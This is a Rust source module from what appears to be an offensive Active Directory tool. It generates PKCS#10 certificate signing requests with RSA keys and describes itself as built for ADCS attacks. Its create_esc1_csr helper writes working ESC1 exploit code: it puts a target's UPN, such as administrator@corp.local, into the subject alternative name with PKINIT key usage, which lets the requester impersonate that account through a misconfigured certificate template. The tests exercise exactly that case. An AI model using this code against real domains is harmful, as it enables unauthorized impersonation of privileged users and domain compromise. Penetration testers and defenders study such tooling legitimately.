//! PKCS#10 Certificate Signing Request (CSR) Generation
//!
//! Implements CSR generation with RSA key pairs for ADCS attacks.
//! Uses ASN.1 DER encoding per RFC 2986.

use crate::error::{OverthroneError, Result};
use base64::Engine;
use rsa::{
    pkcs8::{EncodePrivateKey, EncodePublicKey, LineEnding},
    Pkcs1v15Sign, RsaPrivateKey, RsaPublicKey,
};
use sha2::{Digest, Sha256};
use yasna::models::ObjectIdentifier;
use yasna::Tag;

// ═══════════════════════════════════════════════════════════
// RSA Key Pair
// ═══════════════════════════════════════════════════════════

/// RSA key pair for certificate requests
pub struct RsaKeyPair {
    pub private_key: RsaPrivateKey,
    pub public_key: RsaPublicKey,
    pub key_size: usize,
}

impl RsaKeyPair {
    /// Generate a new RSA key pair
    pub fn generate(key_size: usize) -> Result<Self> {
        let mut rng = rsa::rand_core::OsRng;

        let private_key = RsaPrivateKey::new(&mut rng, key_size)
            .map_err(|e| OverthroneError::Encryption(format!("RSA key generation failed: {}", e)))?;

        let public_key = private_key.to_public_key();

        Ok(Self {
            private_key,
            public_key,
            key_size,
        })
    }

    /// Get private key in PKCS#8 PEM format
    pub fn private_key_pem(&self) -> Result<String> {
        self.private_key
            .to_pkcs8_pem(LineEnding::LF)
            .map_err(|e| OverthroneError::Encryption(format!("PKCS#8 encoding failed: {}", e)))
            .map(|s| s.to_string())
    }

    /// Get private key in PKCS#8 DER format
    pub fn private_key_der(&self) -> Result<Vec<u8>> {
        let doc = self.private_key
            .to_pkcs8_der()
            .map_err(|e| OverthroneError::Encryption(format!("PKCS#8 DER encoding failed: {}", e)))?;
        Ok(doc.as_bytes().to_vec())
    }

    /// Get public key in DER format (for CSR)
    pub fn public_key_der(&self) -> Result<Vec<u8>> {
        let doc = self.public_key
            .to_public_key_der()
            .map_err(|e| OverthroneError::Encryption(format!("Public key DER encoding failed: {}", e)))?;
        Ok(doc.to_vec())
    }
}

// ═══════════════════════════════════════════════════════════
// CSR Subject
// ═══════════════════════════════════════════════════════════

/// CSR Subject (Distinguished Name)
#[derive(Debug, Clone, Default)]
pub struct CsrSubject {
    pub common_name: Option<String>,
    pub country: Option<String>,
    pub organization: Option<String>,
    pub organizational_unit: Option<String>,
    pub locality: Option<String>,
    pub state: Option<String>,
    pub email: Option<String>,
}

impl CsrSubject {
    /// Create a new subject with just a common name
    pub fn new(cn: impl Into<String>) -> Self {
        Self {
            common_name: Some(cn.into()),
            ..Default::default()
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Subject Alternative Name
// ═══════════════════════════════════════════════════════════

/// Subject Alternative Name entry
#[derive(Debug, Clone)]
pub enum SanEntry {
    /// DNS name (dNSName)
    DnsName(String),
    /// Email address (rfc822Name)
    Email(String),
    /// User Principal Name (otherName with UPN OID)
    Upn(String),
}

/// Subject Alternative Name extension
#[derive(Debug, Clone, Default)]
pub struct SubjectAltName {
    pub entries: Vec<SanEntry>,
}

impl SubjectAltName {
    /// Create SAN with a single DNS name
    pub fn dns(name: impl Into<String>) -> Self {
        Self {
            entries: vec![SanEntry::DnsName(name.into())],
        }
    }

    /// Create SAN with a UPN (for ESC1 - impersonate user via PKINIT)
    pub fn upn(upn: impl Into<String>) -> Self {
        Self {
            entries: vec![SanEntry::Upn(upn.into())],
        }
    }

    /// Add a DNS name
    pub fn add_dns(&mut self, name: impl Into<String>) {
        self.entries.push(SanEntry::DnsName(name.into()));
    }

    /// Add a UPN
    pub fn add_upn(&mut self, upn: impl Into<String>) {
        self.entries.push(SanEntry::Upn(upn.into()));
    }
}

// ═══════════════════════════════════════════════════════════
// Extended Key Usage
// ═══════════════════════════════════════════════════════════

/// Extended Key Usage extension
#[derive(Debug, Clone)]
pub struct ExtendedKeyUsage {
    pub purposes: Vec<ObjectIdentifier>,
}

impl ExtendedKeyUsage {
    /// Create EKU for client authentication
    pub fn client_auth() -> Self {
        Self {
            purposes: vec![ObjectIdentifier::from_slice(&[1, 3, 6, 1, 5, 5, 7, 3, 2])],
        }
    }

    /// Create EKU for PKINIT (Kerberos authentication)
    pub fn pkinit_client() -> Self {
        Self {
            purposes: vec![
                ObjectIdentifier::from_slice(&[1, 3, 6, 1, 5, 5, 7, 3, 2]),
                ObjectIdentifier::from_slice(&[1, 3, 6, 1, 5, 2, 3, 4]),
            ],
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Certificate Signing Request (CSR)
// ═══════════════════════════════════════════════════════════

/// PKCS#10 Certificate Signing Request
pub struct CertificateSigningRequest {
    pub subject: CsrSubject,
    pub key_pair: RsaKeyPair,
    pub san: Option<SubjectAltName>,
    pub eku: Option<ExtendedKeyUsage>,
    pub template: Option<String>,
}

impl CertificateSigningRequest {
    /// Create a new CSR with default settings
    pub fn new(subject: CsrSubject) -> Result<Self> {
        let key_pair = RsaKeyPair::generate(2048)?;

        Ok(Self {
            subject,
            key_pair,
            san: None,
            eku: None,
            template: None,
        })
    }

    /// Set Subject Alternative Name
    pub fn set_san(&mut self, san: SubjectAltName) {
        self.san = Some(san);
    }

    /// Set Extended Key Usage
    pub fn set_eku(&mut self, eku: ExtendedKeyUsage) {
        self.eku = Some(eku);
    }

    /// Set the certificate template name
    pub fn set_template(&mut self, template: impl Into<String>) {
        self.template = Some(template.into());
    }

    /// Generate the CSR in DER format
    pub fn to_der(&self) -> Result<Vec<u8>> {
        // Build CertificationRequestInfo
        let cri = self.build_cri();

        // Sign the CRI
        let signature = self.sign_data(&cri)?;

        // Build final CSR
        let csr = yasna::construct_der(|writer| {
            writer.write_sequence(|writer| {
                // CertificationRequestInfo
                writer.next().write_der(&cri);

                // SignatureAlgorithm
                writer.next().write_sequence(|writer| {
                    writer.next().write_oid(&ObjectIdentifier::from_slice(&[1, 2, 840, 113549, 1, 1, 11])); // sha256WithRSA
                    writer.next().write_null();
                });

                // Signature
                writer.next().write_bitvec_bytes(&signature, signature.len() * 8);
            });
        });

        Ok(csr)
    }

    /// Build CertificationRequestInfo
    fn build_cri(&self) -> Vec<u8> {
        yasna::construct_der(|writer| {
            writer.write_sequence(|writer| {
                // version
                writer.next().write_u8(0);

                // subject
                writer.next().write_sequence(|writer| {
                    if let Some(ref cn) = self.subject.common_name {
                        writer.next().write_set(|writer| {
                            writer.next().write_sequence(|writer| {
                                writer.next().write_oid(&ObjectIdentifier::from_slice(&[2, 5, 4, 3])); // CN
                                writer.next().write_utf8_string(cn);
                            });
                        });
                    }
                });

                // subjectPKInfo
                writer.next().write_sequence(|writer| {
                    writer.next().write_sequence(|writer| {
                        writer.next().write_oid(&ObjectIdentifier::from_slice(&[1, 2, 840, 113549, 1, 1, 1])); // RSA
                        writer.next().write_null();
                    });
                    let pk_der = self.key_pair.public_key_der().unwrap_or_default();
                    writer.next().write_bitvec_bytes(&pk_der, pk_der.len() * 8);
                });

                // attributes [0]
                writer.next().write_tagged(Tag::context(0), |writer| {
                    writer.write_set(|writer| {
                        // Extension request
                        if self.san.is_some() || self.eku.is_some() {
                            writer.next().write_sequence(|writer| {
                                // extensionRequest OID
                                writer.next().write_oid(&ObjectIdentifier::from_slice(&[1, 2, 840, 113549, 1, 9, 14]));
                                writer.next().write_set(|writer| {
                                    // Build extensions
                                    let ext_der = self.build_extensions();
                                    writer.next().write_der(&ext_der);
                                });
                            });
                        }

                        // Template attribute
                        if let Some(ref template) = self.template {
                            writer.next().write_sequence(|writer| {
                                writer.next().write_oid(&ObjectIdentifier::from_slice(&[1, 2, 840, 113549, 1, 9, 7]));
                                writer.next().write_set(|writer| {
                                    writer.next().write_utf8_string(template);
                                });
                            });
                        }
                    });
                });
            });
        })
    }

    /// Build extensions DER
    fn build_extensions(&self) -> Vec<u8> {
        yasna::construct_der(|writer| {
            writer.write_sequence(|writer| {
                // SAN extension
                if let Some(ref san) = self.san {
                    writer.next().write_sequence(|writer| {
                        writer.next().write_oid(&ObjectIdentifier::from_slice(&[2, 5, 29, 17])); // san
                        writer.next().write_bool(true); // critical
                        let san_der = self.build_san(san);
                        writer.next().write_bytes(&san_der);
                    });
                }

                // EKU extension
                if let Some(ref eku) = self.eku {
                    writer.next().write_sequence(|writer| {
                        writer.next().write_oid(&ObjectIdentifier::from_slice(&[2, 5, 29, 37])); // eku
                        let eku_der = yasna::construct_der(|w| {
                            w.write_sequence(|writer| {
                                for purpose in &eku.purposes {
                                    writer.next().write_oid(purpose);
                                }
                            });
                        });
                        writer.next().write_bytes(&eku_der);
                    });
                }
            });
        })
    }

    /// Build SAN DER
    fn build_san(&self, san: &SubjectAltName) -> Vec<u8> {
        yasna::construct_der(|writer| {
            writer.write_sequence(|writer| {
                for entry in &san.entries {
                    match entry {
                        SanEntry::DnsName(name) => {
                            writer.next().write_tagged(Tag::context(2), |writer| {
                                writer.write_ia5_string(name);
                            });
                        }
                        SanEntry::Email(email) => {
                            writer.next().write_tagged(Tag::context(1), |writer| {
                                writer.write_ia5_string(email);
                            });
                        }
                        SanEntry::Upn(upn) => {
                            writer.next().write_tagged(Tag::context(0), |writer| {
                                writer.write_sequence(|writer| {
                                    writer.next().write_oid(&ObjectIdentifier::from_slice(&[1, 3, 6, 1, 4, 1, 311, 20, 2, 3]));
                                    writer.next().write_tagged(Tag::context(0), |writer| {
                                        writer.write_utf8_string(upn);
                                    });
                                });
                            });
                        }
                    }
                }
            });
        })
    }

    /// Sign data with the private key
    fn sign_data(&self, data: &[u8]) -> Result<Vec<u8>> {
        // Hash the data with SHA-256
        let mut hasher = Sha256::new();
        hasher.update(data);
        let hash = hasher.finalize();

        // Sign with PKCS#1 v1.5 using unprefixed hash
        let signature = self.key_pair.private_key
            .sign(Pkcs1v15Sign::new_unprefixed(), &hash)
            .map_err(|e| OverthroneError::Encryption(format!("Signing failed: {}", e)))?;

        Ok(signature)
    }

    /// Generate CSR in PEM format
    pub fn to_pem(&self) -> Result<String> {
        let der = self.to_der()?;
        let b64 = base64::engine::general_purpose::STANDARD.encode(&der);

        let lines: Vec<&str> = b64.as_bytes()
            .chunks(64)
            .map(|chunk| std::str::from_utf8(chunk).unwrap_or(""))
            .collect();

        Ok(format!(
            "-----BEGIN CERTIFICATE REQUEST-----\n{}\n-----END CERTIFICATE REQUEST-----\n",
            lines.join("\n")
        ))
    }

    /// Get the private key for this CSR
    pub fn private_key_pem(&self) -> Result<String> {
        self.key_pair.private_key_pem()
    }
}

// ═══════════════════════════════════════════════════════════
// Convenience Functions
// ═══════════════════════════════════════════════════════════

/// Create a CSR for ESC1 attack (SAN abuse)
pub fn create_esc1_csr(
    subject_cn: &str,
    target_upn: &str,
    template: &str,
) -> Result<(Vec<u8>, String)> {
    let mut csr = CertificateSigningRequest::new(CsrSubject::new(subject_cn))?;

    // Add UPN in SAN for PKINIT authentication
    let mut san = SubjectAltName::default();
    san.add_upn(target_upn);
    csr.set_san(san);

    // Set EKU for client authentication
    csr.set_eku(ExtendedKeyUsage::pkinit_client());

    // Set template
    csr.set_template(template);

    let der = csr.to_der()?;
    let private_key = csr.private_key_pem()?;

    Ok((der, private_key))
}

/// Create a CSR for standard client authentication
pub fn create_client_auth_csr(
    subject_cn: &str,
    template: &str,
    san_dns: Option<&str>,
) -> Result<(Vec<u8>, String)> {
    let mut csr = CertificateSigningRequest::new(CsrSubject::new(subject_cn))?;

    // Optional SAN
    if let Some(dns) = san_dns {
        let mut san = SubjectAltName::default();
        san.add_dns(dns);
        csr.set_san(san);
    }

    // Set EKU
    csr.set_eku(ExtendedKeyUsage::client_auth());

    // Set template
    csr.set_template(template);

    let der = csr.to_der()?;
    let private_key = csr.private_key_pem()?;

    Ok((der, private_key))
}

// ═══════════════════════════════════════════════════════════
// Tests
// ═══════════════════════════════════════════════════════════

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_rsa_key_generation() {
        let key_pair = RsaKeyPair::generate(2048).unwrap();
        assert_eq!(key_pair.key_size, 2048);
        assert!(key_pair.private_key_pem().is_ok());
        assert!(key_pair.public_key_der().is_ok());
    }

    #[test]
    fn test_csr_subject() {
        let subject = CsrSubject::new("test.example.com");
        assert_eq!(subject.common_name, Some("test.example.com".to_string()));
    }

    #[test]
    fn test_san_creation() {
        let san = SubjectAltName::upn("admin@corp.local");
        assert_eq!(san.entries.len(), 1);
    }

    #[test]
    fn test_csr_creation() {
        let csr = CertificateSigningRequest::new(CsrSubject::new("test")).unwrap();

        let der = csr.to_der();
        assert!(der.is_ok());

        let pem = csr.to_pem();
        assert!(pem.is_ok());
        let pem = pem.unwrap();
        assert!(pem.contains("BEGIN CERTIFICATE REQUEST"));
    }

    #[test]
    fn test_esc1_csr() {
        let result = create_esc1_csr(
            "attack-machine",
            "administrator@corp.local",
            "User",
        );

        assert!(result.is_ok());
        let (der, private_key) = result.unwrap();
        assert!(!der.is_empty());
        assert!(private_key.contains("BEGIN PRIVATE KEY"));
    }
}
